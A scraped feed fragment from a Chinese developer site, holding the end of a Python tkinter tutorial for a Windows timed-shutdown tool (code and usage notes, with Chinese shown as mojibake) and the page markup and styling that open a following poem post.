                <span class="hljs-comment"># å¯åŠ¨å®šæ—¶ä»»åŠ¡çº¿ç¨‹</span>
                self.shutdown_thread = threading.Thread(
                    target=self.schedule_shutdown_task,
                    args=(hour, minute),
                    daemon=<span class="hljs-literal">True</span>
                )
                self.shutdown_thread.start()
                
                self.is_scheduled = <span class="hljs-literal">True</span>
                self.schedule_btn.config(text=<span class="hljs-string">"åœæ­¢å®šæ—¶ä»»åŠ¡"</span>)
                
                <span class="hljs-comment"># æ›´æ–°çŠ¶æ€æ˜¾ç¤º</span>
                now = datetime.now()
                target_time = datetime(now.year, now.month, now.day, hour, minute)
                <span class="hljs-keyword">if</span> target_time &lt; now:
                    target_time += timedelta(days=<span class="hljs-number">1</span>)
                    
                self.task_status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"å®šæ—¶ä»»åŠ¡å·²å¯åŠ¨"</span>)
                self.next_time_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"ä¸‹æ¬¡å…³æœºæ—¶é—´ï¼š<span class="hljs-subst">{target_time.strftime(<span class="hljs-string">'%Y-%m-%d %H:%M'</span>)}</span>"</span>)
                
                messagebox.showinfo(<span class="hljs-string">"æˆåŠŸ"</span>, 
                    <span class="hljs-string">f"å®šæ—¶ä»»åŠ¡å·²å¯åŠ¨ï¼\n"</span>
                    <span class="hljs-string">f"æ¯å¤© <span class="hljs-subst">{hour:02d}</span>:<span class="hljs-subst">{minute:02d}</span> è‡ªåŠ¨å…³æœº\n"</span>
                    <span class="hljs-string">f"æ³¨æ„ï¼šè¿™æ˜¯ç¨‹åºæ¨¡æ‹Ÿçš„å®šæ—¶ä»»åŠ¡ï¼Œå…³é—­æœ¬ç¨‹åºå°†åœæ­¢"</span>)
                
                self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"å®šæ—¶ä»»åŠ¡å·²å¯åŠ¨ï¼šæ¯å¤© <span class="hljs-subst">{hour:02d}</span>:<span class="hljs-subst">{minute:02d}</span>"</span>)
                
            <span class="hljs-keyword">except</span> ValueError:
                messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆæ•°å­—"</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># åœæ­¢å®šæ—¶ä»»åŠ¡</span>
            self.is_scheduled = <span class="hljs-literal">False</span>
            self.schedule_btn.config(text=<span class="hljs-string">"å¯åŠ¨å®šæ—¶ä»»åŠ¡"</span>)
            self.task_status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"å®šæ—¶ä»»åŠ¡å·²åœæ­¢"</span>)
            self.next_time_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">""</span>)
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"å®šæ—¶ä»»åŠ¡å·²åœæ­¢"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">schedule_shutdown_task</span>(<span class="hljs-params">self, target_hour, target_minute</span>):
        <span class="hljs-string">"""å®šæ—¶ä»»åŠ¡çº¿ç¨‹å‡½æ•°"""</span>
        <span class="hljs-keyword">while</span> self.is_scheduled:
            <span class="hljs-keyword">try</span>:
                now = datetime.now()
                
                <span class="hljs-comment"># è®¡ç®—ä»Šå¤©çš„ç›®æ ‡æ—¶é—´</span>
                target_time = datetime(now.year, now.month, now.day, target_hour, target_minute)
                
                <span class="hljs-comment"># å¦‚æœä»Šå¤©çš„æ—¶é—´å·²è¿‡ï¼Œè®¾ç½®ä¸ºæ˜å¤©</span>
                <span class="hljs-keyword">if</span> target_time &lt; now:
                    target_time += timedelta(days=<span class="hljs-number">1</span>)
                
                <span class="hljs-comment"># è®¡ç®—ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰</span>
                wait_seconds = (target_time - now).total_seconds()
                
                <span class="hljs-comment"># æ¯éš”10ç§’æ£€æŸ¥ä¸€æ¬¡ï¼Œä»¥ä¾¿åŠæ—¶å“åº”åœæ­¢å‘½ä»¤</span>
                <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(wait_seconds / <span class="hljs-number">10</span>)):
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.is_scheduled:
                        <span class="hljs-keyword">return</span>
                    time.sleep(<span class="hljs-number">10</span>)
                
                <span class="hljs-comment"># ç­‰å¾…å‰©ä½™æ—¶é—´</span>
                remaining = wait_seconds % <span class="hljs-number">10</span>
                <span class="hljs-keyword">if</span> remaining &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> self.is_scheduled:
                    time.sleep(remaining)
                
                <span class="hljs-comment"># æ‰§è¡Œå…³æœº</span>
                <span class="hljs-keyword">if</span> self.is_scheduled:
                    subprocess.run(<span class="hljs-string">"shutdown -s -t 60"</span>, shell=<span class="hljs-literal">True</span>)
                    
                    <span class="hljs-comment"># æ›´æ–°çŠ¶æ€</span>
                    self.root.after(<span class="hljs-number">0</span>, <span class="hljs-keyword">lambda</span>: self.task_status_var.<span class="hljs-built_in">set</span>(
                        <span class="hljs-string">f"å·²æ‰§è¡Œå…³æœºå‘½ä»¤ï¼ä¸‹æ¬¡å°†åœ¨æ˜å¤© <span class="hljs-subst">{target_hour:02d}</span>:<span class="hljs-subst">{target_minute:02d}</span>"</span>))
                    
                    <span class="hljs-comment"># é‡ç½®ä¸ºæ˜å¤©</span>
                    time.sleep(<span class="hljs-number">65</span>)  <span class="hljs-comment"># ç­‰å¾…å…³æœºæ‰§è¡Œæ—¶é—´</span>
                    
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å®šæ—¶ä»»åŠ¡é”™è¯¯ï¼š<span class="hljs-subst">{e}</span>"</span>)
                <span class="hljs-keyword">break</span>
                
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_schedule_shutdown</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æµ‹è¯•å®šæ—¶å…³æœºï¼ˆç«‹å³å…³æœºï¼Œä½†ç»™äºˆå–æ¶ˆæ—¶é—´ï¼‰"""</span>
        response = messagebox.askyesno(<span class="hljs-string">"ç¡®è®¤æµ‹è¯•"</span>, 
            <span class="hljs-string">"å°†è®¾ç½®60ç§’åå…³æœºè¿›è¡Œæµ‹è¯•\nè¯·ç¡®ä¿å·²ä¿å­˜æ‰€æœ‰å·¥ä½œ\n\næ˜¯å¦ç»§ç»­ï¼Ÿ"</span>)
        
        <span class="hljs-keyword">if</span> response:
            subprocess.run(<span class="hljs-string">"shutdown -s -t 60"</span>, shell=<span class="hljs-literal">True</span>)
            messagebox.showinfo(<span class="hljs-string">"æµ‹è¯•å¼€å§‹"</span>, 
                <span class="hljs-string">"å·²è®¾ç½®60ç§’åå…³æœº\n"</span>
                <span class="hljs-string">"å¦‚éœ€å–æ¶ˆè¯·ä½¿ç”¨'å–æ¶ˆå®šæ—¶å…³æœº'æŒ‰é’®"</span>)
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"æµ‹è¯•å…³æœºå·²è®¾ç½®ï¼š60ç§’åå…³é—­"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    root = tk.Tk()
    app = ShutdownTimerApp(root)
    root.mainloop()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>
<h3 data-id="heading-6">åŠŸèƒ½è¯´æ˜</h3>
<h4 data-id="heading-7">æ–¹æ³•ä¸€ï¼šå‘½ä»¤è¡Œè®¾ç½®</h4>
<ul>
<li>æä¾›é¢„è®¾æ—¶é—´æŒ‰é’®ï¼ˆ5åˆ†é’Ÿã€30åˆ†é’Ÿã€1å°æ—¶ç­‰ï¼‰</li>
<li>æ”¯æŒè‡ªå®šä¹‰å°æ—¶å’Œåˆ†é’Ÿè®¾ç½®</li>
<li>å®æ—¶æ˜¾ç¤ºå°†è¦æ‰§è¡Œçš„å‘½ä»¤</li>
<li>è®¾ç½®å’Œå–æ¶ˆæŒ‰é’®</li>
</ul>
<h4 data-id="heading-8">æ–¹æ³•äºŒï¼šåˆ›å»ºå¿«æ·æ–¹å¼</h4>
<ul>
<li>è‡ªå®šä¹‰å¿«æ·æ–¹å¼åç§°</li>
<li>è®¾ç½®å…³æœºæ—¶é—´</li>
<li>é¢„è§ˆå¿«æ·æ–¹å¼å†…å®¹</li>
<li>åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼</li>
<li>æµ‹è¯•å¿«æ·æ–¹å¼åŠŸèƒ½</li>
</ul>
<h4 data-id="heading-9">æ–¹æ³•ä¸‰ï¼šå®šæ—¶ä»»åŠ¡ï¼ˆç®€åŒ–ç‰ˆï¼‰</h4>
<ul>
<li>è®¾ç½®æ¯å¤©å›ºå®šæ—¶é—´è‡ªåŠ¨å…³æœº</li>
<li>æ¨¡æ‹ŸWindowsä»»åŠ¡è®¡åˆ’åŠŸèƒ½</li>
<li>æ˜¾ç¤ºä¸‹æ¬¡å…³æœºæ—¶é—´</li>
<li>å¯åŠ¨/åœæ­¢å®šæ—¶ä»»åŠ¡</li>
<li>æµ‹è¯•åŠŸèƒ½</li>
</ul>
<h3 data-id="heading-10">ä½¿ç”¨è¯´æ˜</h3>
<ol>
<li>
<p><strong>è¿è¡Œç¨‹åº</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">python shutdown_timer.py
</code></pre>
</li>
<li>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li>ç¨‹åºéœ€è¦Windowsç³»ç»Ÿæ”¯æŒ</li>
<li>æ–¹æ³•ä¸‰ä¸ºPythonæ¨¡æ‹Ÿå®ç°ï¼Œå…³é—­ç¨‹åºä¼šåœæ­¢å®šæ—¶ä»»åŠ¡</li>
<li>çœŸå®çš„Windowsä»»åŠ¡è®¡åˆ’éœ€è¦ç®¡ç†å‘˜æƒé™å’Œæ›´å¤æ‚çš„é…ç½®</li>
</ul>
</li>
<li>
<p><strong>å®‰å…¨æé†’</strong>ï¼š</p>
<ul>
<li>å®šæ—¶å…³æœºå‰è¯·ä¿å­˜å¥½æ‰€æœ‰å·¥ä½œ</li>
<li>æµ‹è¯•æ—¶å»ºè®®è®¾ç½®è¾ƒçŸ­æ—¶é—´ï¼ˆå¦‚5åˆ†é’Ÿï¼‰</li>
<li>è®°ä½å¯ä»¥ä½¿ç”¨<code>shutdown -a</code>å‘½ä»¤æˆ–ç¨‹åºçš„å–æ¶ˆåŠŸèƒ½</li>
</ul>
</li>
</ol>
<h4 data-id="heading-11"><strong>é‡è¦æé†’</strong></h4>
<ul>
<li><strong>ä¿å­˜å·¥ä½œ</strong>ï¼šåœ¨è®¾ç½®è‡ªåŠ¨å…³æœºå‰ï¼Œè¯·åŠ¡å¿…ä¿å­˜å¥½æ‰€æœ‰æ‰“å¼€çš„æ–‡ä»¶å’Œå·¥ä½œè¿›åº¦ï¼Œé˜²æ­¢æ•°æ®ä¸¢å¤±ã€‚</li>
<li><strong>å–æ¶ˆå‘½ä»¤</strong>ï¼šè®°ä½å–æ¶ˆå‘½ä»¤ <code>shutdown -a</code>ï¼Œæˆ–è€…å»ä»»åŠ¡è®¡åˆ’ç¨‹åºé‡Œç¦ç”¨ä»»åŠ¡ï¼Œä»¥å¤‡ä¸æ—¶ä¹‹éœ€ã€‚</li>
</ul>
<p><strong>æ€»ç»“å»ºè®®</strong>ï¼š</p>
<ul>
<li><strong>ä¸´æ—¶ç”¨ä¸€æ¬¡</strong>ï¼šç”¨ <strong>æ–¹æ³•ä¸€</strong> è¿è¡Œå‘½ä»¤ã€‚</li>
<li><strong>ç»å¸¸å›ºå®šæ—¶é—´ç”¨</strong>ï¼šç”¨ <strong>æ–¹æ³•äºŒ</strong> åˆ›å»ºå¿«æ·æ–¹å¼ã€‚</li>
<li><strong>é•¿æœŸè§„å¾‹æ€§å®šæ—¶</strong>ï¼šç”¨ <strong>æ–¹æ³•ä¸‰</strong> ä»»åŠ¡è®¡åˆ’ç¨‹åºã€‚</li>
<li><strong>æ€•éº»çƒ¦ï¼Œå–œæ¬¢ç‚¹é¼ æ ‡</strong>ï¼šç”¨ <strong>æ–¹æ³•å››</strong> ç¬¬ä¸‰æ–¹è½¯ä»¶ã€‚</li>
</ul>
<p>é€‰æ‹©æœ€é€‚åˆä½ çš„æ–¹æ³•å³å¯ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Šå››æ—¶æ­Œã€‹]]></title>    <link>https://juejin.cn/post/7592520539152941065</link>    <guid>https://juejin.cn/post/7592520539152941065</guid>    <pubDate>2026-01-08T02:29:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592520539152941065" data-draft-id="7592582130593923123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Šå››æ—¶æ­Œã€‹"/> <meta itemprop="keywords" content="æ˜é‡‘Â·æ—¥æ–°è®¡åˆ’"/> <meta itemprop="datePublished" content="2026-01-08T02:29:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Šå››æ—¶æ­Œã€‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:29:28.000Z" title="Thu Jan 08 2026 02:29:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 20px;background-image:url("data:image/png;base64,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")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,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